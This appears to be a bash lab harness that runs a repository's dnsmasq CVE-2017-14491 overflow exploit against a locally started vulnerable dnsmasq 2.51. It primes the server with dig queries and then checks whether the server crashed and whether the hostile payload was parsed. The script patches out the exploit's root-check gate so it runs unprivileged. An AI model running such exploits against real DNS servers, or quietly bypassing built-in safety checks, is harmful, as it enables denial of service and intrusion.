#!/usr/bin/env bash
# Clean E2E: start repo delivery function (root gate neutralised) + dnsmasq 2.51,
# then prime. All logs unbuffered and captured.
set -u
LAB="$(cd "$(dirname "$0")" && pwd)"; cd "$LAB"
REPO="$(dirname "$LAB")"
DM="$LAB/dnsmasq-git/src/dnsmasq"; CONF="$LAB/etc/dnsmasq.conf"
ATT_PID=""; DM_PID=""
trap 'kill $ATT_PID $DM_PID 2>/dev/null' EXIT

# 1) launch repo delivery as its own process, prompts pre-answered
printf '\n\n' > /tmp/masq_input.txt
python3 -u - > e2e_repo.log 2>&1 <<PY &
import os, sys, builtins, importlib.util, shutil
REPO = r"$REPO"
src = open(os.path.join(REPO, "masq_overflow.py")).read().replace("if os.geteuid() != 0:", "if False:")
tmp = "/tmp/masq_noroot.py"; open(tmp, "w").write(src)
spec = importlib.util.spec_from_file_location("masq", tmp)
m = importlib.util.module_from_spec(spec)
try: spec.loader.exec_module(m)
except SystemExit: pass
r = iter(["\n", "\n"])
builtins.input = lambda *a, **k: next(r, "\n")
try: m.exploit_cve_2017_14491("127.0.0.1")
except Exception as e:
    import traceback; traceback.print_exc()
PY
ATT_PID=$!
sleep 2.0
echo "repo delivery pid=$ATT_PID alive=$(kill -0 $ATT_PID 2>/dev/null && echo yes || echo no)"
echo "--- repo log so far ---"; cat e2e_repo.log
echo "--- port 5300 bound? ---"; ss -lnup 2>/dev/null | grep 5300 || echo "  NOT bound"

# 2) dnsmasq 2.51
"$DM" -C "$CONF" --no-daemon > e2e_dm.log 2>&1 & DM_PID=$!
sleep 1.5
echo "dnsmasq pid=$DM_PID alive=$(kill -0 $DM_PID 2>/dev/null && echo yes || echo no)"

# 3) prime
for i in 1 2 3 4 5; do dig @127.0.0.1 -p 53535 -x 8.8.8.125 +time=2 +tries=1 >/dev/null 2>&1; sleep 0.6; done
sleep 2

echo "=== VERDICT ==="
kill -0 "$DM_PID" 2>/dev/null && echo "dnsmasq ALIVE" || echo "dnsmasq DEAD (crashed)"
echo "forwarded count : $(grep -c 'forwarded 125.8.8.8' e2e_dm.log)"
echo "hostile parsed  : $(grep -c 'DCBBEEEE' e2e_dm.log)"
echo "--- repo delivery log ---"; cat e2e_repo.log
